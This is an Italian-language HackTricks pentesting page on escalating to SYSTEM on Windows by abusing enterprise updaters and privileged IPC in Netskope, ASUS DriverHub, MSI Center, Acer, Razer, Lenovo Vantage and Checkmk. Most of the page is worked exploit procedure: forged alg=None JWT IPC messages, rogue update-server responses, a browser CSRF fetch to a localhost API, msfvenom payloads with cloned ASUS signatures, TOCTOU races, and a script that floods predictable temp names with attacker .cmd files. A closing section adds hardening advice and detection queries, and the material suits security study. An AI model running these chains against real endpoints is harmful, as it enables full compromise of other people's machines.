# Abusing Enterprise Auto-Updaters and Privileged IPC (e.g., Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Questa pagina generalizza una classe di catene di local privilege escalation su Windows individuate negli agent e negli updater per endpoint enterprise che espongono una superficie IPC facilmente accessibile e un flusso di aggiornamento privilegiato. Un esempio rappresentativo è Netskope Client for Windows < R129 (CVE-2025-0309), in cui un utente con privilegi ridotti può forzare la registrazione verso un server controllato dall’attaccante e quindi fornire un MSI malevolo che il servizio SYSTEM installa.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

Idee chiave riutilizzabili contro prodotti simili:
- Abusare dell’IPC localhost di un servizio privilegiato per forzare una nuova registrazione o riconfigurazione verso un server controllato dall’attaccante.
- Implementare gli endpoint di aggiornamento del vendor, fornire una Trusted Root CA rogue e indirizzare l’updater verso un pacchetto malevolo “firmato”.
- Eludere controlli deboli del signer (allow-list dei CN), flag digest opzionali e proprietà MSI permissive.
- Se l’IPC è “crittografato”, derivare la chiave/IV da identificatori della macchina leggibili da chiunque e memorizzati nel registry.
- Se il servizio limita i chiamanti in base al percorso dell’immagine o al nome del processo, eseguire l’injection in un processo presente nell’allow-list oppure avviarne uno in stato suspended e fare il bootstrap della DLL tramite una patch minima del contesto del thread.

---
## 1) Forzare la registrazione verso un server controllato dall’attaccante tramite IPC localhost

Molti agent includono un processo UI user-mode che comunica con un servizio SYSTEM tramite TCP localhost usando JSON.

Osservato in Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Flusso di exploit:
1) Creare un token JWT di registrazione le cui claims controllano l’host backend (ad es. AddonUrl). Usare alg=None in modo che non sia richiesta alcuna signature.
2) Inviare il messaggio IPC che invoca il comando di provisioning con il JWT e il nome del tenant:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Il service inizia a contattare il tuo server rogue per enrollment/config, ad esempio:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Note:
- Se la verifica del caller si basa sul path/nome, origina la richiesta da un vendor binary presente nell’allow-list (vedi §4).<sup>[[1]](#references)[[2]](#references)</sup>

---
## 2) Hijacking del canale di update per eseguire codice come SYSTEM

Quando il client comunica con il tuo server, implementa gli endpoint previsti e indirizzalo verso un MSI controllato dall’attacker. Sequenza tipica:

1) /v2/config/org/clientconfig → Restituisci una configurazione JSON con un intervallo dell’updater molto breve, ad esempio:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Restituisce un certificato CA PEM. Il servizio lo installa nell'archivio Trusted Root del Local Machine.
3) /v2/checkupdate → Fornisce metadati che puntano a un MSI malevolo e a una versione falsa.

Bypass dei controlli comuni osservati in the wild:
- Allow-list del CN del signer: il servizio potrebbe controllare solo che il Subject CN sia uguale a “netSkope Inc” o “Netskope, Inc.”. La tua rogue CA può emettere un leaf con quel CN e firmare l'MSI.
- Proprietà CERT_DIGEST: includi una proprietà MSI innocua denominata CERT_DIGEST. Non viene applicata alcuna verifica durante l'installazione.
- Verifica opzionale del digest: un flag di configurazione (ad esempio, check_msi_digest=false) disabilita la validazione crittografica aggiuntiva.

Risultato: il servizio SYSTEM installa il tuo MSI da
C:\ProgramData\Netskope\stAgent\data\*.msi
eseguendo codice arbitrario come NT AUTHORITY\SYSTEM.<sup>[[1]](#references)[[2]](#references)</sup>

Lezione sul patch-bypass: se un vendor risponde consentendo una piccola serie di domini “trusted” invece di autenticare crittograficamente la source dell'update, cerca redirector o reverse proxy di proprietà del vendor che consentano ancora di controllare il traffico. Nel caso di Netskope, ricerche pubbliche successive hanno dimostrato che un allow-list dell'era R129 poteva ancora essere aggirato tramite `rproxy.goskope.com`, che faceva da proxy per contenuti di Azure App Service controllati dall'attacker. Considera gli allow-list degli hostname come un rallentamento, non come un trust boundary.<sup>[[14]](#references)</sup>

---
## 3) Forging di richieste IPC encrypted (quando presente)

A partire da R127, Netskope ha racchiuso il JSON IPC in un campo encryptData che appare come Base64. Il reversing ha mostrato l'uso di AES con key/IV derivati da valori del registry leggibili da qualsiasi user:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Gli attacker possono riprodurre la encryption e inviare comandi encrypted validi da un utente standard.<sup>[[1]](#references)[[2]](#references)</sup> Suggerimento generale: se un agent inizia improvvisamente a “encryptare” il proprio IPC, cerca device ID, product GUID e install ID sotto HKLM da usare come materiale.

---
## 4) Bypass degli allow-list dei caller IPC (controlli su path/name)

Alcuni servizi cercano di autenticare il peer risolvendo il PID della connessione TCP e confrontando il path/name dell'immagine con i binary del vendor presenti nell'allow-list e situati sotto Program Files (ad esempio, stagentui.exe, bwansvc.exe, epdlp.exe).

Due bypass pratici:
- DLL injection in un processo presente nell'allow-list (ad esempio, nsdiag.exe) e proxy dell'IPC dall'interno del processo.
- Avvio di un binary presente nell'allow-list in stato suspended e bootstrap della tua proxy DLL senza CreateRemoteThread (vedi §5) per soddisfare le tamper rules applicate dal driver.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Injection compatibile con la tamper-protection: processo suspended + patch di NtContinue

I prodotti spesso includono un driver minifilter/OB callbacks (ad esempio, Stadrv) per rimuovere i diritti pericolosi dagli handle verso i processi protetti:
- Processo: rimuove PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: limita a THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Un loader user-mode affidabile che rispetta questi vincoli:
1) CreateProcess di un binary del vendor con CREATE_SUSPENDED.
2) Ottieni gli handle che ti sono ancora consentiti: PROCESS_VM_WRITE | PROCESS_VM_OPERATION sul processo e un thread handle con THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (oppure solo THREAD_RESUME se applichi la patch al codice in un RIP noto).
3) Sovrascrivi ntdll!NtContinue (o un altro thunk iniziale sicuramente mappato) con uno stub minimale che chiama LoadLibraryW sul path della tua DLL, quindi torna indietro.
4) ResumeThread per attivare lo stub in-process e caricare la tua DLL.

Poiché non hai mai usato PROCESS_CREATE_THREAD o PROCESS_SUSPEND_RESUME su un processo già protetto (lo hai creato tu), la policy del driver viene rispettata.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) Tooling pratico
- NachoVPN (plugin Netskope) automatizza una rogue CA, la firma di un MSI malevolo e fornisce gli endpoint necessari: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.<sup>[[3]](#references)</sup>
- UpSkope è un client IPC custom che crea messaggi IPC arbitrari (opzionalmente AES-encrypted) e include la suspended-process injection per originare la connessione da un binary presente nell'allow-list.<sup>[[4]](#references)</sup>

## 7) Workflow rapido di triage per superfici updater/IPC sconosciute

Quando analizzi un nuovo endpoint agent o una suite di “helper” della motherboard, un workflow rapido è generalmente sufficiente per capire se stai osservando un target promettente per la privesc:<sup>[[6]](#references)</sup>

1) Enumera i listener loopback e riconducili ai processi del vendor:
```powershell
Get-NetTCPConnection -State Listen |
Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
Select-Object LocalAddress,LocalPort,OwningProcess,
@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```
2) Enumerare le named pipe candidate:
```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```
3) Raccogliere i dati di instradamento archiviati nel registro utilizzati dai server IPC basati su plugin:
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
Select-Object PSChildName
```
4) Estrai prima i nomi degli endpoint, le chiavi JSON e gli ID dei comandi dal client in user mode. I frontend Electron/.NET packed spesso fanno leak dell'intero schema:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
-Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```
5) Cerca il predicato di attendibilità effettivo, non solo il percorso del codice che alla fine avvia il processo:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
-Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```
Pattern che vale la pena prioritizzare:
- `CryptQueryObject`/analisi dei certificati senza `WinVerifyTrust` di solito significa che “il certificato esiste” è stato trattato come “il certificato è trusted”, consentendo il certificate cloning o altri fake-signer tricks.
- I controlli substring/suffix su `Origin`, `Referer`, download URL, nomi dei processi o CN dei signer non sono autenticazione. `contains(".vendor.com")` è solitamente sfruttabile con domini lookalike controllati dall'attaccante.
- Se la GUI a basso privilegio decide che “il file è trusted” e il broker SYSTEM si limita a consumare quel risultato, applicare patch o reimplementare la DLL/JS lato client spesso bypassa completamente il boundary (split validation in stile Razer).
- Se il broker copia un payload in `%TEMP%`/`C:\Windows\Temp` e poi lo valida o lo pianifica da quel percorso, testa immediatamente le finestre di sostituzione TOCTOU e i moduli plugin adiacenti che espongono wrapper `ExecuteTask()` alternativi con controlli più deboli.<sup>[[6]](#references)</sup>

Per i target con un uso intensivo delle named pipe, PipeViewer è un modo rapido per individuare DACL deboli e pipe raggiungibili remotamente prima di iniziare a fare reversing del protocollo in profondità.<sup>[[11]](#references)</sup>

Se il target autentica i caller solo tramite PID, image path o nome del processo, consideralo un rallentamento anziché un boundary: iniettare nel client legittimo o effettuare la connessione da un processo allow-listed è spesso sufficiente per soddisfare i controlli del server. Nello specifico delle named pipe, [questa pagina sull'impersonation del client e sul pipe abuse](named-pipe-client-impersonation.md) tratta la primitive più in dettaglio.

---
## 8) Broker di add-in modulari autenticati solo tramite firme del vendor (pattern Lenovo Vantage)

Una variante più recente che vale la pena cercare è il **signed-client RPC broker**: un processo desktop Lenovo-signed a basso privilegio comunica con un servizio SYSTEM e il servizio instrada comandi JSON verso un insieme di add-in descritti tramite XML in `%ProgramData%`. Una volta ottenuta la code execution **all'interno di un qualsiasi signed client accettato**, ogni contratto `runas="system"` entra a far parte della tua attack surface.<sup>[[15]](#references)</sup>

Primitive ad alto valore osservate nella ricerca su Lenovo Vantage:
- **Fidarsi del caller perché è firmato dal vendor**: i ricercatori hanno raggiunto un contesto autenticato copiando un EXE Lenovo-signed in una directory scrivibile e soddisfacendo un DLL side-load (`profapi.dll`), in modo da eseguire codice arbitrario all'interno di un client di cui il servizio si fidava già.
- **Scoperta dell'attack surface basata sui manifest**: gli add-in sono dichiarati in `C:\ProgramData\Lenovo\Vantage\Addins\*.xml`; diversi contratti vengono eseguiti come `SYSTEM`, quindi enumerare questi manifest spesso rivela i verbi privilegiati effettivi più rapidamente del reversing del broker stesso.
- **Bug per singolo comando dietro il canale autenticato**: una volta all'interno del client trusted, la ricerca pubblica ha individuato path traversal + race condition nei verbi di update/install, raw-SQL abuse nei database delle impostazioni privilegiate e controlli dei registry path basati su substring che consentivano scritture al di fuori dell'hive previsto.

Recon utile su un target:
```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
-Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```
Practical takeaway: ogni volta che una helper suite espone un broker che prima autentica il **caller process** e solo dopo inoltra le richieste a decine di comandi di plugin/add-in, non fermarti dopo aver bypassato il controllo di trust iniziale. Esegui il dump della tabella manifest/contract e sottoponi ogni verbo ad alto privilegio a fuzzing in modo indipendente; il canale autenticato nasconde solitamente diversi bug di secondo livello.

---
## 1) CSRF browser-to-localhost contro API HTTP con privilegi (ASUS DriverHub)

DriverHub distribuisce un servizio HTTP in user-mode (ADU.exe) su 127.0.0.1:53000 che si aspetta chiamate dal browser provenienti da https://driverhub.asus.com. Il filtro dell'origin esegue semplicemente `string_contains(".asus.com")` sull'header Origin e sugli URL di download esposti da `/asus/v1.0/*`. Qualsiasi host controllato dall'attaccante, come `https://driverhub.asus.com.attacker.tld`, supera quindi il controllo e può inviare richieste che modificano lo stato tramite JavaScript.<sup>[[6]](#references)</sup> Consulta [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) per ulteriori pattern di bypass.

Flusso pratico:
1) Registra un dominio che contenga `.asus.com` e ospita lì una pagina web malevola.
2) Usa `fetch` o XHR per chiamare un endpoint con privilegi, ad esempio `Reboot` o `UpdateApp`, su `http://127.0.0.1:53000`.
3) Invia il body JSON previsto dall'handler: il frontend JS packed mostra lo schema riportato di seguito.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Anche la CLI di PowerShell mostrata di seguito ha esito positivo quando l'header Origin viene contraffatto con il valore attendibile:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Qualsiasi visita del browser al sito dell’attacker diventa quindi un CSRF locale con 1 click (o 0 click tramite `onload`) che controlla un helper SYSTEM.

---
## 2) Verifica insicura del code-signing e cloning del certificato (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` scarica eseguibili arbitrari definiti nel corpo JSON e li memorizza nella cache `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. La validazione dell’URL di download riutilizza la stessa logica basata su substring, quindi `http://updates.asus.com.attacker.tld:8000/payload.exe` viene accettato. Dopo il download, ADU.exe verifica soltanto che il PE contenga una firma e che la stringa Subject corrisponda ad ASUS prima di eseguirlo: nessun `WinVerifyTrust`, nessuna validazione della chain.

Per weaponize il flusso:
1) Crea un payload (ad esempio, `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Clona il signer di ASUS al suo interno (ad esempio, `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Ospita `pwn.exe` su un dominio lookalike `.asus.com` e attiva UpdateApp tramite il CSRF del browser descritto sopra.

Poiché sia i filtri Origin sia quelli URL sono basati su substring e il controllo del signer confronta soltanto stringhe, DriverHub scarica ed esegue il binary dell’attacker nel proprio contesto elevato.<sup>[[6]](#references)</sup>

---
## 1) TOCTOU nei percorsi di copia/esecuzione dell’updater (MSI Center CMD_AutoUpdateSDK)

Il servizio SYSTEM di MSI Center espone un protocollo TCP in cui ogni frame è composto da `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. Il componente principale (Component ID `0f 27 00 00`) include `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Il suo handler:
1) Copia l’eseguibile fornito in `C:\Windows\Temp\MSI Center SDK.exe`.
2) Verifica la firma tramite `CS_CommonAPI.EX_CA::Verify` (il subject del certificato deve essere uguale a “MICRO-STAR INTERNATIONAL CO., LTD.” e `WinVerifyTrust` deve avere esito positivo).
3) Crea un scheduled task che esegue il file temporaneo come SYSTEM con argomenti controllati dall’attacker.

Il file copiato non viene bloccato tra la verifica e `ExecuteTask()`. Un attacker può:
- Inviare il Frame A indicando un binary firmato da MSI legittimo (garantisce il superamento del controllo della firma e l’accodamento del task).
- Creare una race con messaggi Frame B ripetuti che puntano a un payload malevolo, sovrascrivendo `MSI Center SDK.exe` subito dopo il completamento della verifica.

Quando lo scheduler si attiva, esegue il payload sovrascritto come SYSTEM nonostante sia stato validato il file originale. Un’exploitation affidabile usa due goroutine/thread che inviano ripetutamente CMD_AutoUpdateSDK finché viene vinta la window TOCTOU.<sup>[[6]](#references)</sup>

---
## 2) Abuso di IPC custom a livello SYSTEM e impersonation (MSI Center + Acer Control Centre)

### Set di comandi TCP di MSI Center
- Ogni plugin/DLL caricato da `MSI.CentralServer.exe` riceve un Component ID memorizzato in `HKLM\SOFTWARE\MSI\MSI_CentralServer`. I primi 4 byte di un frame selezionano quel componente, consentendo agli attacker di instradare i comandi verso moduli arbitrari.
- I plugin possono definire i propri task runner. `Support\API_Support.dll` espone `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` e chiama direttamente `API_Support.EX_Task::ExecuteTask()` senza alcuna validazione della firma: qualsiasi utente locale può indicare `C:\Users\<user>\Desktop\payload.exe` e ottenere in modo deterministico l’esecuzione come SYSTEM.
- Lo sniffing del loopback con Wireshark o l’analisi strumentale dei binary .NET in dnSpy rivela rapidamente la mappatura Component ↔ command; i client custom Go/Python possono quindi riprodurre i frame.<sup>[[6]](#references)</sup>

### Named pipe di Acer Control Centre e livelli di impersonation
- `ACCSvc.exe` (SYSTEM) espone `\\.\pipe\treadstone_service_LightMode` e la sua discretionary ACL consente client remoti (ad esempio, `\\TARGET\pipe\treadstone_service_LightMode`). L’invio del command ID `7` con un file path richiama la routine del servizio che crea processi.
- La libreria client serializza un byte terminatore magic (113) insieme agli argomenti. L’instrumentation dinamica con Frida/`TsDotNetLib` (consulta [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) per suggerimenti sull’instrumentation) mostra che l’handler nativo mappa questo valore su un `SECURITY_IMPERSONATION_LEVEL` e su un integrity SID prima di chiamare `CreateProcessAsUser`.
- La sostituzione di 113 (`0x71`) con 114 (`0x72`) porta al generic branch, che conserva il token SYSTEM completo e imposta un SID di integrità elevata (`S-1-16-12288`). Il binary avviato viene quindi eseguito come SYSTEM senza restrizioni, sia localmente sia tra macchine.
- Combina questo con il flag dell’installer esposto (`Setup.exe -nocheck`) per predisporre ACC anche su lab VM ed esercitare la pipe senza hardware del vendor.<sup>[[6]](#references)</sup>

Questi bug IPC evidenziano perché i servizi localhost devono applicare la mutual authentication (ALPC SID, filtri `ImpersonationLevel=Impersonation`, token filtering) e perché ogni helper di modulo “run arbitrary binary” deve condividere le stesse verifiche del signer.

---
## 3) Helper COM/IPC “elevator” supportati da una debole validazione in user-mode (Razer Synapse 4)

Razer Synapse 4 ha aggiunto un altro pattern utile a questa famiglia: un utente a bassi privilegi può chiedere a un helper COM di avviare un processo tramite `RzUtility.Elevator`, mentre la decisione di trust viene delegata a una DLL in user-mode (`simple_service.dll`) invece di essere applicata in modo robusto all’interno del confine privilegiato.

Percorso di exploitation osservato:
- Istanzia l’oggetto COM `RzUtility.Elevator`.
- Chiama `LaunchProcessNoWait(<path>, "", 1)` per richiedere un avvio elevato.
- Nel PoC pubblico, il gate della firma PE all’interno di `simple_service.dll` viene patchato prima di inviare la richiesta, consentendo l’avvio di un eseguibile arbitrario scelto dall’attacker.<sup>[[6]](#references)</sup>

Invocazione PowerShell minima:
```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```
Considerazione generale: durante il reverse engineering delle suite “helper”, non fermarti a TCP localhost o alle named pipe. Controlla la presenza di classi COM con nomi come `Elevator`, `Launcher`, `Updater` o `Utility`, quindi verifica se il servizio privilegiato convalida effettivamente il binary di destinazione oppure si limita a fidarsi di un risultato calcolato da una DLL client in user-mode modificabile. Questo pattern è generalizzabile oltre Razer: qualsiasi design suddiviso in cui il broker con privilegi elevati utilizza una decisione allow/deny proveniente dal lato a privilegi ridotti può rappresentare una superficie di privesc.


---
## Esecuzione prevedibile di script temporanei durante la riparazione MSI (Checkmk Agent / CVE-2024-0670)

Alcuni agent Windows implementano ancora le azioni privilegiate scrivendo un `.cmd` temporaneo in `C:\Windows\Temp` ed eseguendolo come `SYSTEM`. Se il nome del file è prevedibile e il servizio non ricrea in modo sicuro i file esistenti, un utente con pochi privilegi può creare in anticipo il futuro file temporaneo come **read-only** e fare in modo che il processo privilegiato esegua contenuto controllato dall'attacker invece del proprio script.

Build vulnerabili di Checkmk Agent osservate:
- pattern temporaneo: `cmk_all_<PID>_1.cmd`
- branch interessati: `2.0.0`, `2.1.0`, `2.2.0`
- trigger: **repair** MSI del package dell'agent memorizzato nella cache<sup>[[8]](#references)[[9]](#references)</sup>

Workflow pratico:
1. Stima un intervallo realistico di PID dagli ID dei processi correnti o dal PID dell'agent in esecuzione.
2. Scrivi un payload `.cmd` breve in **ASCII** (`Set-Content -Encoding Ascii` o redirection di `cmd.exe`; evita l'output PowerShell in UTF-16 per i batch file).
3. Distribuisci `C:\Windows\Temp\cmk_all_<PID>_1.cmd` nell'intervallo candidato e imposta ogni file come read-only.
4. Attiva una repair dell'MSI memorizzato nella cache, in modo che il servizio privilegiato tenti di rigenerare ed esegua lo script temporaneo.<sup>[[7]](#references)</sup>
```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```
Se il prodotto vulnerabile è installato con Windows Installer, associa l'MSI memorizzato nella cache dall'aspetto casuale in `C:\Windows\Installer` al nome del prodotto prima di attivare il ripristino:<sup>[[7]](#references)</sup>
```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
ForEach-Object {
$p = Get-ItemProperty $_.PSPath
[PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
} | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```
Note operative:
- `qwinsta` è utile quando `msiexec /fa` non riesce da una shell WinRM non interattiva e occorre capire se una sessione desktop esistente/disconnessa può attivare correttamente la riparazione.<sup>[[7]](#references)</sup>
- Questo pattern si applica anche ad altri endpoint agent e updater che **preparano script temporanei in posizioni scrivibili da tutti e in seguito li eseguono come SYSTEM**. Verificare la presenza di nomi prevedibili, l'assenza di semantiche di creazione esclusiva e flussi di riparazione/aggiornamento attivabili on demand.

---
## Hijacking remoto della supply chain tramite una validazione debole dell'updater (WinGUp / Notepad++)

Tra giugno 2025 e dicembre 2025, gli attaccanti che avevano compromesso l'infrastruttura di hosting alla base del flusso di aggiornamento di Notepad++ hanno distribuito selettivamente manifest malevoli a vittime specifiche. Gli updater meno recenti basati su WinGUp non verificavano completamente l'autenticità degli aggiornamenti, quindi una risposta XML ostile poteva reindirizzare i client verso URL controllati dagli attaccanti. Poiché il client accettava contenuti HTTPS senza imporre sia una catena di certificati trusted sia una firma PE valida sull'installer scaricato, le vittime scaricavano ed eseguivano un `update.exe` NSIS trojanizzato.<sup>[[12]](#references)[[13]](#references)</sup>

Flusso operativo (non è richiesto alcun exploit locale):
1. **Intercettazione dell'infrastruttura**: compromettere la CDN/l'hosting e rispondere ai controlli degli aggiornamenti con metadati dell'attaccante che puntano a un URL di download malevolo.
2. **NSIS trojanizzato**: l'installer scarica/esegue un payload e sfrutta due execution chain:
- **Bring-your-own signed binary + sideload**: includere il `BluetoothService.exe` firmato di Bitdefender e inserire una `log.dll` malevola nel relativo search path. Quando il signed binary viene eseguito, Windows esegue il sideload di `log.dll`, che decritta e carica in modo riflessivo la backdoor Chrysalis (protetta da Warbird + API hashing per ostacolare il rilevamento statico).
- **Scripted shellcode injection**: NSIS esegue uno script Lua compilato che utilizza API Win32 (ad esempio `EnumWindowStationsW`) per iniettare shellcode e preparare Cobalt Strike Beacon.<sup>[[12]](#references)</sup>

Indicazioni di hardening/detection per qualsiasi auto-updater:
- Applicare la **verifica del certificato + della firma** dell'installer scaricato (fissare il signer del vendor, rifiutare CN/catena non corrispondenti) e firmare anche il manifest dell'aggiornamento (ad esempio con XMLDSig). Bloccare i redirect controllati dal manifest se non sono stati validati.
- Considerare il **BYO signed binary sideloading** come pivot di detection post-download: generare un alert quando un EXE firmato di un vendor carica una DLL con un determinato nome al di fuori del suo percorso canonico di installazione (ad esempio Bitdefender che carica `log.dll` da Temp/Downloads) e quando un updater deposita/esegue installer da directory temporanee con firme non appartenenti al vendor.
- Monitorare gli **artefatti specifici del malware** osservati in questa chain (utili come pivot generici): il mutex `Global\Jdhfv_1.0.1`, scritture anomale di `gup.exe` in `%TEMP%` e fasi di shellcode injection guidate da Lua.
- Notepad++ ha risposto rafforzando WinGUp nella v8.8.9 e nelle versioni successive: l'XML restituito è ora firmato (XMLDSig) e le build più recenti applicano la verifica del certificato + della firma dell'installer scaricato invece di fidarsi esclusivamente del transport.<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – sideload di EXE firmato da Bitdefender con <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> che avvia un installer diverso da Notepad++</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

Questi pattern si applicano a qualsiasi updater che accetti manifest non firmati o non riesca a vincolare i firmatari degli installer: hijacking della rete + installer malevolo + sideloading con firma propria consentono l'esecuzione di codice da remoto sotto l'apparenza di aggiornamenti “trusted”.

---
## Riferimenti
- [1] [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – Local Privilege Escalation via writable files in Checkmk Agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Privilege escalation in Windows agent](https://checkmk.com/werk/16361)
- [10] [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – Bypassing the fix for CVE-2025-0309 in Netskope Client for Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – Uncovering Privilege Escalation Bugs in Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)

{{#include ../../banners/hacktricks-training.md}}
